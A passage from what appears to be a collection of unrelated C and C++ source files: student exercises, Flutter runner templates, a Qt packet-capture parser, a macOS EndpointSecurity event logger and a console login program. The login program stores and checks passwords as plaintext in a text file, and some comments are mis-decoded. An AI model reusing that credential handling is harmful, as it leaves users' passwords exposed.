= r; // \u00c7\u00e0\u00e4\u00e0\u00e5\u00ec \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 \u00f6\u00e5\u00ed\u00fb\n    }\n    double findMax(double max)\n    {\n        if (price > max)\n            max = price;\n        return max;\n    }\n    friend ostream& operator<<(ostream& os, const expo& ob);\n};\nostream& operator<<(ostream& os, const expo& ob) {\n    os << \"name: \" << ob.name << \" cost: \" << ob.cost << \" duration: \" << ob.duration << \" price: \" << ob.price << endl;\n    return os;\n}\nint main()\n{\n    ifstream input(\"D:/text/input.txt\");\n    ofstream output(\"D:/text/output.txt\");\n    int n; // \u00cd\u00e5\u00e8\u00e7\u00e2\u00e5\u00f1\u00f2\u00ed\u00ee\u00e5 \u00f7\u00e8\u00f1\u00eb\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00e2\n    input >> n;\n    string str; double r; int d; double p; // \u00c2\u00f1\u00ef\u00ee\u00ec\u00ee\u00e3\u00e0\u00f2\u00e5\u00eb\u00fc\u00ed\u00fb\u00e5 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00fb\u00e5 \u00e4\u00eb\u00ff \u00e2\u00e2\u00ee\u00e4\u00e0 \u00ec\u00e0\u00f0\u00ea\u00e8\n    // \u00e0\u00e2\u00f2\u00ee\u00ec\u00ee\u00e1\u00e8\u00eb\u00ff \u00e8 \u00f0\u00e0\u00f1\u00f5\u00ee\u00e4\u00e0 \u00f2\u00ee\u00ef\u00eb\u00e8\u00e2\u00e0\n\n    expo* pExpo; // \u00d3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc \u00ed\u00e0 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\n    pExpo = new expo[n]; // \u00c4\u00eb\u00ff \u00ea\u00e0\u00e6\u00e4\u00ee\u00e3\u00ee \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00e2\u00fb\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2\u00f1\u00ff \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e1\u00e5\u00e7 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00ee\u00e2,\n    // \u00f2.\u00e5. \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00fb \"\u00ef\u00f3\u00f1\u00f2\u00fb\u00e5\" \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00fb\n    vector<expo> vecExpo(n); // \u00d1\u00ee\u00e7\u00e4\u00e0\u00e5\u00ec \u00ef\u00f3\u00f1\u00f2\u00fb\u00e5 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00fb, \u00e2\u00fb\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2\u00f1\u00ff \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e1\u00e5\u00e7 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00ee\u00e2\n\n    // \u00d6\u00e8\u00ea\u00eb \u00e2\u00e2\u00ee\u00e4\u00e0 \u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00e4\u00eb\u00ff \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00e2\n    for (size_t i = 0; i < n; i++)\n    {\n        input >> str; // \u00c2\u00e2\u00ee\u00e4 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00ff\n        input >> r; // \u00c2\u00e2\u00ee\u00e4 \u00f1\u00f2\u00ee\u00e8\u00ec\u00ee\u00f1\u00f2\u00e8\n        input >> d; // \u00c2\u00e2\u00ee\u00e4 \u00e4\u00eb\u00e8\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00f1\u00f2\u00e8 \u00fd\u00ea\u00f1\u00ef\u00ee\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00ff\n        p = d * r; //\u00cf\u00ee\u00e4\u00f1\u00f7\u00e5\u00f2 \u00f1\u00f3\u00ec\u00ec\u00fb\n        pExpo[i].set(str, r, d, p); // \u00c2\u00fb\u00e7\u00fb\u00e2\u00e0\u00e5\u00ec \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00fe set \u00e4\u00eb\u00ff \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00e8 \u00ef\u00ee\u00eb\u00e5\u00e9\n        vecExpo[i].set(str, r, d, p); // \u00c8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00e4\u00eb\u00ff vector\n        // \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00e2\n    }\n    // \u00d6\u00e8\u00ea\u00eb \u00ef\u00e5\u00f7\u00e0\u00f2\u00e8 \u00ef\u00ee\u00eb\u00e5\u00e9 \u00e4\u00eb\u00ff \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00e2\n    for (size_t i = 0; i < n; i++) {\n        output << pExpo[i] << endl;\n        cout << pExpo[i] << endl;\n    }\n    double max = 0;\n    for (size_t i = 0; i < n; i++) if (max < pExpo[i].findMax(max)) max = pExpo[i].findMax(max);\n    cout << \"Max price= \" << max;\n    output << \"Max price= \" << max;\n    //system(\"pause\");\n}\n",
    "#include <EndpointSecurity/EndpointSecurity.h>\n#include <signal.h>\n#include <unistd.h>\n\n#include \"config.h\"\n#include \"esdump.h\"\n\nconstexpr int EVENT_COUNT = sizeof(TARGET_EVENTS) / sizeof(TARGET_EVENTS[0]);\n\nvoid log_event(es_client_t* c, const es_message_t* m) {\n    auto event_metadata = event_data.at(m->event_type);\n    const std::string event_fmt = json{\n        {\"type\", event_metadata.type_name},\n        {\"data\", event_metadata.serialize_fn(m->event)}\n    }.dump(JSON_INDENT);\n\n    printf(\"%s,\\n\", event_fmt.c_str());\n\n    (void)c;\n}\n\nvoid handle_auth_event(es_client_t* c, const es_message_t* m) {\n    log_event(c, m);\n\n    es_respond_result_t ret = es_respond_auth_result(c, m, ES_AUTH_RESULT_ALLOW, false);\n    if (ret != ES_RESPOND_RESULT_SUCCESS) {\n        printf(\"ERROR: Failed to respond to authorization event: %d\\n\", ret);\n    }\n}\n\nconstexpr auto event_handler = ^(es_client_t* c, const es_message_t* m) {\n    if (m->action_type == ES_ACTION_TYPE_AUTH) {\n        return handle_auth_event(c, m);\n    }\n    else if (m->action_type == ES_ACTION_TYPE_NOTIFY) {\n        return log_event(c, m);\n    }\n\n    printf(\"ERROR: Unknown action type: %d\\n\", m->action_type);\n};\n\nbool create_client(es_client_t** client) {\n    es_new_client_result_t ret = es_new_client(client, event_handler);\n    if (ret != ES_NEW_CLIENT_RESULT_SUCCESS) {\n        if (ret == ES_NEW_CLIENT_RESULT_ERR_NOT_PRIVILEGED) {\n            printf(\"ERROR: Root privileges are required to create an ES client\\n\");\n        }\n        else if (ret == ES_NEW_CLIENT_RESULT_ERR_NOT_ENTITLED) {\n            printf(\"ERROR: SIP must be disabled and the binary must have the endpoint security entitlement to create an ES client\\n\");\n        }\n        else {\n            printf(\"ERROR: Failed to create an ES client: %d\\n\", ret);\n        }\n\n        return false;\n    }\n\n    return true;\n}\n\nbool go() {\n    es_client_t* client = NULL;\n    if (!create_client(&client)) {\n        return false;\n    }\n\n    es_return_t ret = es_subscribe(client, TARGET_EVENTS, EVENT_COUNT);\n    if (ret != ES_RETURN_SUCCESS) {\n        printf(\"ERROR: Failed to subscribe to ES events %d\\n\", ret);\n        return false;\n    }\n\n    return true;\n}\n\nvoid stop(int s) {\n    printf(\"Exiting...\\n\");\n    exit(0);\n    \n    (void)s;\n}\n\nint main(int argc, char** argv) {\n    struct sigaction sigIntHandler;\n\n    sigIntHandler.sa_handler = stop;\n\n    sigemptyset(&sigIntHandler.sa_mask);\n    sigIntHandler.sa_flags = 0;\n\n    sigaction(SIGINT, &sigIntHandler, NULL);\n\n    go();\n    pause();\n\n    return 0;\n\n    (void)argc;\n    (void)argv;\n}\n",
    "#include \"capture.h\"\r\n#include <QDebug>\r\n#include <QString>\r\n\r\n\r\nCapture::Capture(){\r\n    this->isDone = false;\r\n    this->pointer = nullptr;\r\n    this->header = nullptr;\r\n    this->pkt_data = nullptr;\r\n}\r\nbool Capture::setPointer(pcap_t *pointer){\r\n    this->pointer = pointer;\r\n    if(pointer)\r\n        return true;\r\n    else return false;\r\n}\r\n\r\nvoid Capture::setFlag(){\r\n    this->isDone = true;\r\n}\r\n\r\nvoid Capture::resetFlag(){\r\n    this->isDone = false;\r\n}\r\n\r\nQString Capture::byteToHex(u_char *str, int size){\r\n    QString res = \"\";\r\n    for(int i = 0;i < size;i++){\r\n        char one = str[i] >> 4;\r\n        if(one >= 0x0A)\r\n            one = one + 0x41 - 0x0A;\r\n        else one = one + 0x30;\r\n        char two = str[i] & 0xF;\r\n        if(two >= 0x0A)\r\n            two = two  + 0x41 - 0x0A;\r\n        else two = two + 0x30;\r\n        res.append(one);\r\n        res.append(two);\r\n    }\r\n    return res;\r\n}\r\n\r\nvoid Capture::run(){\r\n    unsigned int number_package = 0;\r\n    while(true){\r\n        if(isDone)\r\n            break;\r\n        int res = pcap_next_ex(pointer,&header,&pkt_data);\r\n        if(res == 0)\r\n            continue;\r\n        local_time_version_sec = header->ts.tv_sec;\r\n        localtime_s(&local_time,&local_time_version_sec);\r\n        strftime(timeString,sizeof(timeString),\"%H:%M:%S\",&local_time);\r\n        QString info = \"\";\r\n        int type = ethernetPackageHandle(pkt_data,info);\r\n        if(type){\r\n            DataPackage data;\r\n            int len = header->len;\r\n            data.setPackageType(type);\r\n            data.setTimeStamp(QString(timeString));\r\n            data.setDataLength(len);\r\n            data.setPackagePointer(pkt_data,len);\r\n            data.setPackageInfo(info);\r\n            if(data.pkt_content != nullptr){\r\n                emit send(data);\r\n                number_package++;\r\n            }else continue;\r\n        }\r\n        else continue;\r\n    }\r\n    return;\r\n}\r\n\r\nint Capture::ethernetPackageHandle(const u_char *pkt_content,QString& info){\r\n    ETHER_HEADER* ethernet;\r\n    u_short ethernet_type;\r\n    ethernet = (ETHER_HEADER*)pkt_content;\r\n    ethernet_type = ntohs(ethernet->ether_type);\r\n\r\n    switch(ethernet_type){\r\n    case 0x0800:{// ip package\r\n        int dataPackage = 0;\r\n        int res = ipPackageHandle(pkt_content,dataPackage);\r\n        switch (res) {\r\n        case 1:{// icmp package\r\n            info = icmpPackageHandle(pkt_content);\r\n            return 2;\r\n        }\r\n        case 6:{// tcp package\r\n            return tcpPackageHandle(pkt_content,info,dataPackage);\r\n\r\n        }\r\n        case 17:{ // udp package\r\n            int type = udpPackageHandle(pkt_content,info);\r\n            return type;\r\n        }\r\n        default:break;\r\n        }\r\n        break;\r\n    }\r\n    case 0x0806:{// arp package\r\n        info = arpPackageHandle(pkt_content);\r\n        return 1;\r\n    }\r\n    default:{// undefined package\r\n        break;\r\n    }\r\n    }\r\n    return 0;\r\n}\r\n// ip package\r\nint Capture::ipPackageHandle(const u_char *pkt_content,int& ipPackage){\r\n    /*\r\n+------+-----+-----+\r\n|   1  |  6  |  17 |\r\n+------+-----+-----+\r\n| ICMP | TCP | UDP |\r\n+------+-----+-----+\r\n*/\r\n    IP_HEADER* ip;\r\n    ip = (IP_HEADER*)(pkt_content + 14);\r\n    int protocol = ip->protocol;\r\n    ipPackage = (htons(ip->total_length) - (ip->versiosn_head_length & 0x0F) * 4);\r\n    return protocol;\r\n}\r\n// icmp package\r\n/*\r\n * part of the protocol of type and code\r\n * if you need detail information, pls check the official documents\r\n+------+------+------------------------------------------------+\r\n| type | code |                   information                  |\r\n+------+------+------------------------------------------------+\r\n|  0   |   0  |     Echo response (ping command response)      |\r\n+------+------+------------------------------------------------+\r\n|      |   0  |             Network unreachable                |\r\n+      +------+------------------------------------------------+\r\n|      |   1  |             Host unreachable                   |\r\n+      +------+------------------------------------------------+\r\n|      |   2  |              Protocol unreachable              |\r\n+      +------+------------------------------------------------+\r\n|   3  |   3  |              Port unreachable                  |\r\n+      +------+------------------------------------------------+\r\n|      |   4  |    Fragmentation is required, but DF is set    |\r\n+      +------+------------------------------------------------+\r\n|      |   5  |        Source route selection failed           |\r\n+      +------+------------------------------------------------+\r\n|      |   6  |            Unknown target network              |\r\n+------+------+------------------------------------------------+\r\n|   4  |   0  | Source station suppression [congestion control]|\r\n+------+------+------------------------------------------------+\r\n|   5  |  any |                  Relocation                    |\r\n+------+------+------------------------------------------------+\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ramdom_xuc_xac\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*Reema Chintala  \nrechinta  \nPA6*/  \n\n#include<iostream>\n#include<string>\n#include<stdexcept>\n#include\"List.h\"\n#include\"BigInteger.h\"\n\n#include <cmath>\n\nusing namespace std;\n\n\n//CHANGE BEFORE SUBMITTING\n\n\nconst int power = 9;\nconst int base = std::pow(10, power);\n\n// Exported type  -------------------------------------------------------------\n\n\n\n\n// Class Constructors & Destructors ----------------------------------------\n\n// BigInteger()\n// Constructor that creates a new BigInteger in the zero state: \n// signum=0, digits=().\nBigInteger::BigInteger(){\n\n    signum=0;\n    digits = List();\n\n}\n\n// BigInteger()\n// Constructor that creates a new BigInteger from the long value x.\nBigInteger::BigInteger(long x){\n\n   digits = List();\n\n   if (x > 0){\n      signum=1;\n   }\n   else if (x < 0){\n      signum=-1;\n   }\n   else{\n      signum=0;\n   }\n\n   x = abs(x);\n\n\n   do{\n\n      \n\n      digits.insertBefore(x % base);\n      digits.movePrev();\n      x = x / base;\n      \n   } while (x > base);\n\n   if (signum == 0){\n      digits.clear();\n   }\n\n   \n   \n\n}\n\n// BigInteger()\n// Constructor that creates a new BigInteger from the string s.\n// Pre: s is a non-empty string consisting of (at least one) base 10 digit\n// {0,1,2,3,4,5,6,7,8,9}, and an optional sign {+,-} prefix.\nBigInteger::BigInteger(std::string s){\n\n\n   digits = List();\n\n   if (s.size() == 0){\n      throw std::invalid_argument(\"Value must not be an empty string\");\n   }\n\n   string::size_type ch = s.find_first_not_of(\"+-0123456789\"); \n   \n   if (ch != std::string::npos) {\n      throw std::invalid_argument(\"Value is invalid\");\n   } \n\n   string::size_type plus_minus = s.substr(1, s.size()-1).find_first_not_of(\"0123456789\"); \n\n   \n   if (plus_minus != std::string::npos) {\n      throw std::invalid_argument(\"plus/minus must be in front\");\n   } \n\n   if (s[0] == '-'){\n      signum=-1;\n      \n   }\n   else if (s[0] == '+'){\n      signum=1;\n   }\n   else{\n\n      string::size_type zero = s.find_first_not_of(\"0\"); \n      if (zero == std::string::npos) {\n         signum=0;\n         \n      }\n      else{\n         signum=1;\n      }\n   }\n\n\n   \n   while (s.length() > 0){\n      \n      if (s.length()>=power){\n\n         digits.insertAfter(std::abs(stol(s.substr(s.length() - power, power))));\n         s.erase(s.length() - power, power);\n\n      }\n      else{\n\n         string::size_type checksign = s.find_first_not_of(\"+-\"); \n   \n         if (checksign != std::string::npos) {\n            digits.insertAfter(std::abs(stol(s)));\n         } \n         \n         // << stol(s) << endl;\n         s.erase();\n      }\n   }\n\n   digits.moveFront();\n\n\n   while ((digits.length() > 0) && (digits.peekNext() == 0)){\n      digits.eraseAfter();\n      \n   }\n   \n\n\n\n\n\n\n   \n\n   \n\n}\n\n// BigInteger()\n// Constructor that creates a copy of N.\nBigInteger::BigInteger(const BigInteger& N){\n   \n   signum=N.sign();\n   digits = N.digits;\n\n}\n\n// Optional Destuctor\n// ~BigInteger()\n// ~BigInteger();\n\n\n// Access functions --------------------------------------------------------\n\n// sign()\n// Returns -1, 1 or 0 according to whether this BigInteger is positive, \n// negative or 0, respectively.\nint BigInteger::sign() const{\n\n   return signum;\n\n}\n\n// compare()\n// Returns -1, 1 or 0 according to whether this BigInteger is less than N,\n// greater than N or equal to N, respectively.\nint BigInteger::compare(const BigInteger& N) const{\n\n   if (signum != N.signum){\n      \n      if (signum > N.signum){\n         return 1;\n         \n      }\n      else{\n         return -1;\n         \n      }\n\n   }\n\n\n   if ((digits == N.digits) || (signum == 0 && N.signum == 0) ){\n\n\n      return 0;\n\n   }\n\n   \n   \n\n   \n\n   List A = digits;\n   List B = N.digits;\n\n   if (A.length() > B.length()){\n\n      return 1;\n      \n   }\n   else if (A.length() < B.length()){\n      return -1;\n\n   }\n   else{\n\n      \n\n      A.moveFront();\n      B.moveFront();\n\n      while (A.position() != A.length()){\n         if (A.peekNext() > B.peekNext()){\n            \n            return 1;\n            \n         }\n         else if (A.peekNext() < B.peekNext()){\n            \n            return -1;\n         }\n\n         A.moveNext();\n         B.moveNext();\n\n      }\n\n   }\n\n   return 999;\n}\n\n\n// Manipulation procedures -------------------------------------------------\n\n// makeZero()\n// Re-sets this BigInteger to the zero state.\nvoid BigInteger::makeZero(){\n\n   signum = 0;\n   digits.clear();\n\n}\n\n// negate()\n// If this BigInteger is zero, does nothing, otherwise reverses the sign of \n// this BigInteger positive <--> negative. \nvoid BigInteger::negate(){\n\n   signum = -signum;\n\n}\n\n\n// BigInteger Arithmetic operations ----------------------------------------\n\nvoid negateList(List& digits){\n\n   digits.moveFront();\n\n   for (int i = 0; i < digits.length() ; i++){\n      digits.setAfter(-(digits.peekNext()));\n      digits.moveNext();\n   }\n   \n}\n\n\n\nint normalize(List& digits){\n\n\n   if (digits.length() == 0){\n      return 0;\n   }\n\n   digits.moveFront();\n\n\n   while ((digits.length() >= 1) && (digits.peekNext() == ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"kandy_vpn\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"addmangadialog.h\"\n\nAddMangaDialog::AddMangaDialog(QWidget *parent)\n    : QDialog(parent) {\n    setWindowTitle(\"Adicionar Mang\u00e1\");\n\n    isbnEdit = new QLineEdit(this);\n    titleEdit = new QLineEdit(this);\n    authorEdit = new QLineEdit(this);\n    startYearEdit = new QLineEdit(this);\n    endYearEdit = new QLineEdit(this);\n    genreEdit = new QLineEdit(this);\n    magazineEdit = new QLineEdit(this);\n    publisherEdit = new QLineEdit(this);\n    editionYearEdit = new QLineEdit(this);\n    volumesCountEdit = new QLineEdit(this);\n    acquiredVolumesCountEdit = new QLineEdit(this);\n    acquiredVolumesListEdit = new QLineEdit(this);\n    saveButton = new QPushButton(\"Salvar\", this);\n\n    QFormLayout *formLayout = new QFormLayout;\n    formLayout->addRow(\"ISBN:\", isbnEdit);\n    formLayout->addRow(\"T\u00edtulo:\", titleEdit);\n    formLayout->addRow(\"Autor(es):\", authorEdit);\n    formLayout->addRow(\"Ano de In\u00edcio:\", startYearEdit);\n    formLayout->addRow(\"Ano de Fim:\", endYearEdit);\n    formLayout->addRow(\"G\u00eanero:\", genreEdit);\n    formLayout->addRow(\"Revista:\", magazineEdit);\n    formLayout->addRow(\"Editora:\", publisherEdit);\n    formLayout->addRow(\"Ano da Edi\u00e7\u00e3o:\", editionYearEdit);\n    formLayout->addRow(\"Quantidade de Volumes:\", volumesCountEdit);\n    formLayout->addRow(\"Volumes Adquiridos:\", acquiredVolumesCountEdit);\n    formLayout->addRow(\"Lista de Volumes Adquiridos:\", acquiredVolumesListEdit);\n\n    QVBoxLayout *mainLayout = new QVBoxLayout;\n    mainLayout->addLayout(formLayout);\n    mainLayout->addWidget(saveButton);\n\n    setLayout(mainLayout);\n\n    connect(saveButton, &QPushButton::clicked, this, &AddMangaDialog::onSaveButtonClicked);\n}\n\nvoid AddMangaDialog::onSaveButtonClicked() {\n    // Implementar funcionalidade de salvar mang\u00e1\n    accept();\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n\nusing namespace std;\n\nclass User {\npublic:\n    string username;\n    string password;\n\n    User(string uname, string pwd) : username(uname), password(pwd) {}\n};\n\nvoid saveUser(const User& user) {\n    ofstream file(\"users.txt\", ios::app);\n    if (file.is_open()) {\n        file << user.username << \" \" << user.password << endl;\n        file.close();\n    } else {\n        cout << \"Unable to open file\" << endl;\n    }\n}\n\nbool checkUser(const string& username, const string& password) {\n    ifstream file(\"users.txt\");\n    string uname, pwd;\n    if (file.is_open()) {\n        while (file >> uname >> pwd) {\n            if (uname == username && pwd == password) {\n                return true;\n            }\n        }\n        file.close();\n    }\n    return false;\n}\n\nvoid registerUser() {\n    string username, password;\n    cout << \"Enter username: \";\n    cin >> username;\n    cout << \"Enter password: \";\n    cin >> password;\n\n    User newUser(username, password);\n    saveUser(newUser);\n    cout << \"Registration successful!\" << endl;\n}\n\nvoid loginUser() {\n    string username, password;\n    cout << \"Enter username: \";\n    cin >> username;\n    cout << \"Enter password: \";\n    cin >> password;\n\n    if (checkUser(username, password)) {\n        cout << \"Login successful!\" << endl;\n    } else {\n        cout << \"Invalid username or password.\" << endl;\n    }\n}\n\nint main() {\n    int choice;\n    while (true) {\n        cout << \"1. Register\" << endl;\n        cout << \"2. Login\" << endl;\n        cout << \"3. Exit\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                registerUser();\n                break;\n            case 2:\n                loginUser();\n                break;\n            case 3:\n                return 0;\n            default:\n                cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    }\n    return 0;\n}\n",
    "#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <time.h>\r\nint n,u;\r\nstruct tous\r\n\t   {\r\n\t\tchar titre[50];\r\n\t\tlong isbn;\r\n\t\tint edition;\r\n\t\tint exmp;\r\n\t\tlong id;\r\n\t\tchar nom[50];\r\n\t\tchar prenom[50];\r\n\t\tint date;\r\n\t\tint anset;\r\n\t\tint dateed;\r\n\t\tint dateef;\r\n\t\tchar titreres[50];\r\n\t   };\r\n\t   \r\nstruct tous l[2000];\r\nvoid ajout();\r\nvoid suppression();\r\nvoid modification();\r\nvoid ajouta();\r\nvoid suppressiona();\r\nvoid modificationa();\r\nvoid recherche();\r\nint main(){\r\n\tint x,y,z,w,i;\r\n\t printf(\"                                                    +********************************************************+\\n\");\r\n     printf(\"                                                    *        B I B L I O T H E Q U E   H E M   B E T A       *\\n\");\r\n     printf(\"                                                    +********************************************************+\\n\");\r\n     printf(\"CLIQUER SUR ENTRER POUR CONTINUER :))))\");\r\n     getchar();\r\n\t   home:\r\n\t   \tprintf(\"Pour gerer les livres taper 1 ||\");\r\n\t   \tprintf(\" Pour gerer les abonnes de la bibliotheque taper 2:\\n\");\r\n\t   \tprintf(\"Pour chercher un livre taper 4:||\");\r\n\t   \tprintf(\" Pour voir les livres reserve taper 5:\\n\");\r\n\t   \tscanf(\"%d\", &x);\r\n\t   \tsystem(\"cls\");\r\n\t   \tif(x==1)\r\n\t   {\r\n\t   \tprintf(\"Pour ajouter un livre taper 1:\\n\");\r\n\t   \tprintf(\"Pour supprimer un livre taper 2:\\n\");\r\n\t   \tprintf(\"Pour modifier un livre taper 3:\\n\");\r\n\t   \tprintf(\"Pour quitter et retourner a l'acceuil taper 0:\\n\");\r\n\t   \tscanf(\"%d\", &y);\r\n\t   \tsystem(\"cls\");\r\n\t   \tswitch (y)\r\n\t\t   {\r\n\t   \t\tcase 1:\r\n\t   \t\t   {\r\n\t   \t\t   \tajout();\r\n\t   \t\t   \t\r\n\t\t\t   }\r\n\t\t\t   goto home;\r\n\t   \t\tbreak;\r\n\t   \t\tcase 2:\r\n\t   \t\t\t{\r\n\t   \t\t\tsuppression();\t\r\n\t\t\t\t}\r\n\t\t\tgoto home;\r\n\t\t    break;\r\n\t\t    case 3:\r\n\t\t    \t{\r\n\t\t    \tmodification();\t\r\n\t\t\t\t}\r\n\t\t\tgoto home;\r\n\t\t\tbreak;\r\n\t\t\tcase 0:\r\n\t\t    \t{\r\n\t\t    \t\tgoto home;\r\n\t\t\t\t}\r\n\t\t\tbreak;\r\n\t   \t    }\r\n\t   \t}\r\n\t   if(x==2)\r\n\t   {\r\n\t   \tprintf(\"Pour ajouter un abonne taper 1:\\n\");\r\n\t   \tprintf(\"Pour supprimer un abonne taper 2:\\n\");\r\n\t   \tprintf(\"Pour modifier un abonne taper 3:\\n\");\r\n\t   \tprintf(\"Pour quitter et retourner a l'acceuil taper 0:\\n\");\r\n\t   \tscanf(\"%d\", &z);\r\n\t   \tsystem(\"cls\");\r\n\t   \tswitch (z)\r\n\t   \t   {\r\n\t   \t\tcase 1:\r\n\t   \t\t   {\r\n\t   \t\t   \tajouta();\r\n\t\t\t   }\r\n\t\t\tgoto home;\r\n\t   \t\tbreak;\r\n\t   \t\tcase 2:\r\n\t   \t\t\t{\r\n\t\t\t\t  suppressiona(); \t\r\n\t\t\t\t}\r\n\t\t\tgoto home;\r\n\t\t    break;\r\n\t\t    case 3:\r\n\t\t    \t{\r\n\t\t    \t\tmodificationa();\r\n\t\t\t\t}\r\n\t\t\tgoto home;\r\n\t\t\tbreak;\r\n\t\t\t case 0:\r\n\t\t    \t{\r\n\t\t    \tgoto home;\r\n\t\t\t\t}\r\n\t\t\tbreak;\r\n\t\t   }\r\n\t   }\r\n\t   \tif(x==4)\r\n\t\t{\r\n\t\t   \trecherche();\r\n\t\t   \tgoto home;\r\n\t\t}\t\r\n\t\tif(x==5)\r\n\t   {\r\n\t   \tprintf(\"voila la liste des livres reserve :)\\n\");\r\n     //struct tous l[u];\r\n     for(i=1 ; i<=u ; i++)\r\n\t {\r\n\t \tprintf(\"Livre n %d : %s\\n\",i,l[i].titreres);\r\n\t \tprintf(\"\\n^^^^^^^^^^^^^^^^^\\n\");\r\n\t \tgoto home;\r\n\t }\r\n\t   }\r\n\treturn 0;\r\n\t}\r\n\tvoid ajout()\r\n\t{\r\n\t\tint i,j;\r\n\t\tprintf(\"Entrer le nombre de livre que vous voulez ajouter :)\\n\");\r\n\t\tscanf(\"%d\", &n);\r\n\t\tsystem(\"cls\");\r\n\t\t//struct tous l[n];\r\n\t\t for(i=1 ; i<=n ; i++)\r\n\t\t{\r\n\t\t\tprintf(\"Entrer le titre du livre numero %d:\\t\", i);\r\n\t\t\tscanf(\"%s\",&l[i].titre);\r\n\t\t\tprintf(\"Entrer l'ISBN du livre numero %d:\\t\", i);\r\n\t\t\tscanf(\"%ld\",&l[i].isbn);\r\n\t\t\tprintf(\"Entrer l'edition du livre numero %d:\\t\", i);\r\n\t\t\tscanf(\"%d\",&l[i].edition);\r\n\t\t\tprintf(\"Entrer le nombre d'exemplaire du livre numero %d:\\t\", i);\r\n\t\t\tscanf(\"%d\",&l[i].exmp);\r\n\t\t\tprintf(\"\\n***************\\n\");\r\n\t\t\t}\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tprintf(\"Le(s) livres ont etaient ajoute avec succes :) \\n\");\r\n\t\t\tprintf(\"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ \\n\");\r\n\treturn;\r\n\t}\r\n    void suppression()\r\n\t{\r\n     int i,s,j;\r\n     printf(\"voila la liste des livres disponibles :)\\n\");\r\n     //struct tous l[n];\r\n     for(i=1 ; i<=n ; i++)\r\n\t {\r\n\t \tprintf(\"Livre n %d : %s\\n\",i,l[i].titre);\r\n\t \tprintf(\"\\n^^^^^^^^^^^^^^^^^\\n\");\r\n\t }\r\n\t printf(\"Taper l'indice 